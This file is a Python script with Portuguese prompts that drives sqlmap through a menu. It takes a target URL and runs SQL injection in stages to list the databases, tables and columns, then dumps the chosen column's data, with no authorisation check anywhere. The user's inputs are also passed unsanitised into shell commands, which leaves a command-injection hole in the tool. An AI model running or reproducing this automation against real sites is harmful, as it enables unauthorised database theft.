import os
# Colors ##########################################
C = '\033[1;34m'
###################################################
def menu():
	os.system('sh banner.sh')
	try:
		print(C+" ")
		SQLAUTO = int(input("\033[1;34m[々]~>> : "))

		if SQLAUTO == 1:
		     print(" ")
		     print(' Digite a sua URL...')
		     print(" ")
		     URL = input("[々]~>> : ")
		     os.system('cd && cd sqlmap && python2 sqlmap.py -u ' + URL + ' --risk 2 --level 2 --batch --dbs')
		     print(" ")
		     print(' Digite a DATABASE...')
		     print(" ")
		     DATABASE = input("[々]~>> : ")
		     os.system('cd && cd sqlmap && python2 sqlmap.py -u ' + URL + ' --risk 2 --level 2 --batch -D ' + DATABASE + ' --tables')
		     print(" ")
		     print(' Digite a TABELA...')
		     print(" ")
		     TABELA = input("[々]~>> : ")
		     os.system('cd && cd sqlmap && python2 sqlmap.py -u ' + URL + ' --risk 2 --level 2 --batch -D ' + DATABASE + ' -T ' + TABELA + ' --columns')
		     print(" ")
		     print(' Digite a COLUNA...')
		     print(" ")
		     COLUNA = input(" [々]~>> : ")
		     os.system('cd && cd sqlmap && python2 sqlmap.py -u ' + URL + ' --risk 2 --level 2 --batch -D ' + DATABASE + ' -T ' + TABELA + ' -C ' + COLUNA + ' --dump')
		     print(" ")
		     print(" ")
		     print('Processo Terminado...')
		     exit()
		elif SQLAUTO == 2:
		     print(" ")
		     print('Good Bye...')
		     exit()
		else:
		     print(" ")
		     print("[々] Command not found!")
		     os.system('sleep 3')
		     menu()
	except ValueError:
		print(' Escolha uma das opções acima...')
		os.system('sleep 3')
		menu()
	except KeyboardInterrupt:
		print(' CTRL+C negado...')
		print('Reiniciando Script...')
		os.system('sleep 3')
		menu()
menu()
